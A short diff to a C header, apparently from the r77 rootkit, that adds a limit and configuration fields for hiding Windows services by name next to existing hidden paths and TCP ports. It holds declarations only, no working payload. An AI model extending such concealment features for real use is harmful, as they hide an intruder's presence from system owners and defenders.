@@ -63,6 +63,10 @@
 /// </summary>
 #define R77_CONFIG_MAX_HIDDEN_PATHS				100
 /// <summary>
+/// The maximum number of services that can be hidden by name.
+/// </summary>
+#define R77_CONFIG_MAX_HIDDEN_SERVICE_NAMES		100
+/// <summary>
 /// The maximum number of local TCP ports that can be hidden.
 /// </summary>
 #define R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS	100
@@ -147,6 +151,14 @@ typedef struct _R77_CONFIG
 	/// An array of file or directory full paths to hide in addition to files and directories hidden by the prefix.
 	/// </summary>
 	LPWSTR *HiddenPaths;
+	/// <summary>
+	/// The number of service names to hide.
+	/// </summary>
+	DWORD HiddenServiceNameCount;
+	/// <summary>
+	/// An array of service names to hide in addition to services hidden by the prefix.
+	/// </summary>
+	LPWSTR *HiddenServiceNames;
 	/// <summary>
 	/// The number of hidden local TCP ports.
 	/// </summary>
@@ -241,7 +253,7 @@ BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit);
 /// <returns>
 /// A pointer to the function, or NULL, if either the DLL was not found or does not have a function by the specified name.
 /// </returns>
-PVOID GetFunction(LPCSTR dll, LPCSTR function);
+LPVOID GetFunction(LPCSTR dll, LPCSTR function);
 /// <summary>
 /// Gets the integrity level of a process.
 /// </summary>
